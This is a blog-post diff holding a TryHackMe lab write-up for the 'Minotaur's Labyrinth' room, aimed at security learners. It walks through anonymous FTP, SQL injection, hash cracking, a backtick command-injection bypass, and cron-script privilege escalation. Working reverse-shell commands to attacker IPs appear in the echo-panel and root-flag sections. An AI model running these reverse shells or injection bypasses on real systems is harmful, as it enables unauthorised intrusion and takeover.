@@ -1,0 +1,357 @@
+---
+layout: post
+title:  "Minotaur's Labyrinth - TryHackMe"
+author: "dnstun0 (Jim Keeler)"
+date:   2022-01-14 13:39:00 -0500
+categories: tryhackme writeup
+tags: medium
+---
+![Minotaur's Labyrinth](/assets/img/20220114134031.png)
+
+[Minotaur's Labyrinth](https://tryhackme.com/room/labyrinth8llv) is another vulnerable web application with a built-in web shell for gaining user access. The labyrinth theme keeps things interesting and you have to find a privileged user by cracking some passwords before you can access the web shell. There are also a pair of flags hidden along the way which give this box a CTF feel. Overall, it was enjoyable challenge. Let's get started on how to solve it.
+
+> 🔔 Please note: To comply with TryHackMe’s write-up requirements, I’ve included a link to TryHackMe above and redacted all passwords, cracked hashes, and flags.
+
+# Initial Enumeration
+
+As always, we start with a port scan.
+
+```console
+$ sudo nmap -T4 -A minotaur
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-14 13:39 EST
+Nmap scan report for minotaur
+Host is up (0.16s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT    STATE SERVICE  VERSION
+21/tcp   open  ftp      ProFTPD
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 pub
+80/tcp  open  http     Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
+| http-title: Login
+|_Requested resource was login.html
+|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
+443/tcp open  ssl/http Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
+|_http-title: Bad request!
+| tls-alpn: 
+|_  http/1.1
+|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE
+| Not valid before: 2004-10-01T09:10:30
+|_Not valid after:  2010-09-30T09:10:30
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=1/14%OT=80%CT=1%CU=39334%PV=Y%DS=4%DC=T%G=Y%TM=61E1C37
+OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST1
+OS:1NW6%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
+OS:(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 52.88 seconds
+```
+
+# First Flag
+
+FTP is open and `nmap`'s `ftp-anon` script indicates anonymous logins are allowed. Let's start there. FTP to minotaur with the username anonymous and no password.
+
+```console
+$ ftp minotaur
+Connected to minotaur.
+220 ProFTPD Server (ProFTPD) [::ffff:10.10.88.99]
+Name (minotaur:dnstun0): anonymous
+331 Anonymous login ok, send your complete email address as your password
+Password:
+230 Anonymous access granted, restrictions apply
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> 
+```
+
+Once we are logged in, there is a `pub` directory available. Be sure to use `ls -al` to list files so you can see the `.secret` directory inside `pub`.
+
+```
+ftp> ls -al
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   3 root     root         4096 Jun 15  2021 .
+drwxr-xr-x   3 root     root         4096 Jun 15  2021 ..
+drwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 pub
+226 Transfer complete
+ftp> cd pub
+250 CWD command successful
+ftp> ls -al
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 .
+drwxr-xr-x   3 root     root         4096 Jun 15  2021 ..
+drwxr-xr-x   2 root     root         4096 Jun 15  2021 .secret
+-rw-r--r--   1 root     root          141 Jun 15  2021 message.txt
+226 Transfer complete
+ftp> 
+```
+
+Inside the `.secret` folder is the flag! Use the `get` command to download it.
+
+```
+ftp> cd .secret
+250 CWD command successful
+ftp> ls -al
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   2 root     root         4096 Jun 15  2021 .
+drwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 ..
+-rw-r--r--   1 root     root           30 Jun 15  2021 flag.txt
+-rw-r--r--   1 root     root          114 Jun 15  2021 keep_in_mind.txt
+226 Transfer complete
+ftp> get flag.txt
+local: flag.txt remote: flag.txt
+200 PORT command successful
+150 Opening BINARY mode data connection for flag.txt (30 bytes)
+226 Transfer complete
+30 bytes received in 0.00 secs (70.4252 kB/s)
+ftp> quit
+221 Goodbye.
+
+$ cat flag.txt
+REDACTED
+```
+
+# Leaked Credentials
+
+HTTP and HTTPS are also open.  Let's see what the browser renders.
+
+![](/assets/img/20220114134257.png)
+
+It's a simple login page. We could try brute forcing it, but lets see if there are any other publicly accessible pages.
+
+I had some horrible network latency again with TryHackMe's VPN. I eventually got feroxbuster to show me a _logs_ directory. Apache is configured to display the directory contents, so we can easily traverse to a log file:
+
+_http://minotaur/logs/post/post_log.log_
+```text
+POST /minotaur/minotaur-box/login.php HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 36
+sec-ch-ua: "Chromium";v="93", " Not;A Brand";v="99"
+Accept: */*
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
+sec-ch-ua-platform: "Windows"
+Origin: http://127.0.0.1
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://127.0.0.1/minotaur/minotaur-box/login.html
+Accept-Encoding: gzip, deflate
+Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=8co2rbqdli7itj8f566c61nkhv
+Connection: close
+
+email=Daedalus&password=REDACTED
+```
+
+It's a captured HTTP request with a username and password. Trying the credentials successfully logs us into the site.
+
+![](/assets/img/20220114135319.png)
+
+# Dumping and Cracking Hashes
+
+There's a search form that lets us query People or Creatures. Trying a typical SQL injection payload works immediately and gets us a complete list of users and password hashes.
+
+![](/assets/img/20220114135843.png)
+
+Let's use [hashcat](https://hashcat.net/hashcat/) and the [rockyou](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz) password list to see if we can crack any of them.
+
+```console
+hashcat -m0 -a0 people /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+hashcat (v6.1.1) starting...
+...
+42354020b68c7ed28dcdeabd5a2baf8e:REDACTED
+0b3bebe266a81fbfaa79db1604c4e67f:REDACTED
+b83f966a6f5a9cff9c6e1c52b0aa635b:REDACTED
+1765db9457f496a39859209ee81fbda4:REDACTED
+Approaching final keyspace - workload adjusted.
+
+
+Session..........: hashcat
+Status...........: Exhausted                                                                                                                     
+Hash.Name........: MD5                                                                                                                     
+Hash.Target......: people
+...
+```
+
+Four out of five isn't bad! And the one we didn't crack was the one we found in the log file anyway.
+
+Let's change the query table to Creatures and run our SQLi payload again; four more hashes are appended to the page. Let's crack those too.
+
+```console
+hashcat -m0 -a0 creatures /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+hashcat (v6.1.1) starting...
+...
+3898e56bf6fa6ddfc3c0977c514a65a8:REDACTED
+5d20441c392b68c61592b2159990abfe:REDACTED
+f847149233ae29ec0e1fcf052930c044:REDACTED
+ea5540126c33fe653bf56e7a686b1770:REDACTED
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: MD5
+Hash.Target......: creatures
+...
+```
+
+# Second Flag
+
+With all of the hashes cracked, we can authenticate as each user and see if any of them have elevated privileges. Sure enough, when we log in as M!notaur there's a flag in the menu and an extra link to "Secret_Stuff".
+
+![](/assets/img/20220114142110.png)
+
+# Exploiting the Echo Panel
+
+The "Secret_Stuff" page is just an "echo" tool. Whatever you type into the form gets echoed onto the page. It appears there is a filter because some commands and characters print a sort of error message to the page instead of the submitted value:
+
+_You really think this is gonna be possible i fixed this @Deadalus -\_- !!!?_
+
+Fortunately one crucial character is not restricted and we can execute commands by enclosing them in backticks (```). Using the `cat` command, we can see the filter being applied in `echo.php`.
+
+```php
+preg_match('/[#!@%^&*()$_=\[\]\';,{}:>?~\\\\]/', $search)
+```
+
+This makes crafting a bypass much easier than guessing. We can create a bash reverse shell by base64 encoding it.
+
+`base64 -d <<< YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEg | /bin/bash`
+
+Be sure to add spaces to your reverse shell command until the encoded output has no trailing `=`; since it's a restricted character. Set up a listener and then submit the payload (wrapped in backticks) and we should have a successful reverse shell.
+
+```console
+$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.6.125.202] from (UNKNOWN) [10.10.240.244] 44298
+bash: cannot set terminal process group (744): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+daemon@labyrinth:/opt/lampp/htdocs$ 
+```
+
+## User flag
+Finding the user flag is straightforward. It's in the "user" home directory which is accessible to the _daemon_ user that we've just obtained access as.
+
+```console
+daemon@labyrinth:/opt/lampp/htdocs$ cd /home
+cd /home
+daemon@labyrinth:/home$ ls -al
+ls -al
+total 20
+drwxr-xr-x  5 root     root     4096 jún   18  2021 .
+drwxr-xr-x 26 root     root     4096 nov    9 13:37 ..
+drwxr-xr-x  2 anonftp  anonftp  4096 jún   18  2021 anonftp
+drwxr-xr-x 18 minotaur minotaur 4096 nov    9 13:35 minotaur
+drwxr-xr-x  2 daemon   daemon   4096 jún   15  2021 user
+daemon@labyrinth:/home$ cd user
+cd user
+daemon@labyrinth:/home/user$ ls -al
+ls -al
+total 12
+drwxr-xr-x 2 daemon daemon 4096 jún   15  2021 .
+drwxr-xr-x 5 root   root   4096 jún   18  2021 ..
+-rw-r--r-- 1 daemon daemon   29 jún   15  2021 flag.txt
+daemon@labyrinth:/home/user$ cat flag.txt
+cat flag.txt
+REDACTED
+```
+
+On to the root flag.
+
+## Root flag
+Listing everything under the root mount, you can see there's an unusual directory called `timers`.
+
+```console
+daemon@labyrinth:/$ ls -al
+ls -al
+total 728648
+drwxr-xr-x  26 root root      4096 nov    9 13:37 .
+drwxr-xr-x  26 root root      4096 nov    9 13:37 ..
+drwxr-xr-x   2 root root      4096 szept 20 08:41 bin
+drwxr-xr-x   3 root root      4096 nov    9 13:38 boot
+drwxrwxr-x   2 root root      4096 jún   15  2021 cdrom
+drwxr-xr-x  17 root root      4100 jan   15 02:48 dev
+drwxr-xr-x 126 root root     12288 nov   10 11:19 etc
+drwxr-xr-x   5 root root      4096 jún   18  2021 home
+lrwxrwxrwx   1 root root        32 nov    9 13:37 initrd.img -> boot/initrd.img-5.4.0-90-generic
+lrwxrwxrwx   1 root root        32 nov    9 13:37 initrd.img.old -> boot/initrd.img-5.4.0-89-generic
+drwxr-xr-x  21 root root      4096 jún   15  2021 lib
+drwxr-xr-x   2 root root      4096 szept 20 11:17 lib64
+drwx------   2 root root     16384 jún   15  2021 lost+found
+drwxr-xr-x   2 root root      4096 aug    7  2020 media
+drwxr-xr-x   2 root root      4096 aug    7  2020 mnt
+drwxr-xr-x   3 root root      4096 jún   15  2021 opt
+dr-xr-xr-x 248 root root         0 jan   15 02:46 proc
+drwxr-xr-x   2 root root      4096 jún   15  2021 reminders
+drwx------   7 root root      4096 jún   15  2021 root
+drwxr-xr-x  29 root root       940 jan   15 03:21 run
+drwxr-xr-x   2 root root     12288 szept 20 08:41 sbin
+drwxr-xr-x  14 root root      4096 szept 23 11:43 snap
+drwxr-xr-x   2 root root      4096 jún   16  2021 srv
+-rw-------   1 root root 746009600 jún   15  2021 swapfile
+dr-xr-xr-x  13 root root         0 jan   15 02:46 sys
+drwxrwxrwx   2 root root      4096 jún   15  2021 timers
+drwxrwxrwt  13 root root      4096 jan   15 03:45 tmp
+drwxr-xr-x  11 root root      4096 aug    7  2020 usr
+drwxr-xr-x  16 root root      4096 jún   15  2021 var
+lrwxrwxrwx   1 root root        29 nov    9 13:37 vmlinuz -> boot/vmlinuz-5.4.0-90-generic
+lrwxrwxrwx   1 root root        29 nov    9 13:37 vmlinuz.old -> boot/vmlinuz-5.4.0-89-generic
+daemon@labyrinth:/$ 
+```
+
+Inside we find a timer shell script with 777 file permissions.
+
+```console
+daemon@labyrinth:/$ cd timers
+daemon@labyrinth:/timers$ ls -al
+total 12
+drwxrwxrwx  2 root root 4096 jún   15  2021 .
+drwxr-xr-x 26 root root 4096 nov    9 13:37 ..
+-rwxrwxrwx  1 root root   70 jún   15  2021 timer.sh
+```
+
+It's a simple script that echoes some text to a file. I suspect this script is executed by a root cron job. Let's set up a second netcat listener on port `4445` and add a reverse shell command to the script.
+
+```console
+$ nc -nvlp 4445
+listening on [any] 4445 ...
+```
+
+```
+daemon@labyrinth:/timers$ cat timer.sh
+cat timer.sh
+#!/bin/bash
+echo "dont fo...forge...ttt" >> /reminders/dontforget.txt
+daemon@labyrinth:/timers$ 
+daemon@labyrinth:/timers$ echo "/bin/bash -i >& /dev/tcp/10.6.125.202/4445 0>&1" >> timer.sh
+```
+
+After about a minute, the shell connects and we have root access!
+
+```console
+$ nc -nvlp 4445
+listening on [any] 4445 ...
+connect to [10.6.125.202] from (UNKNOWN) [10.10.88.99] 52728
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+```
+
+The last thing to do is collect the flag.
+
+```
+# cat da_king_flek.txt
+REDACTED
+```
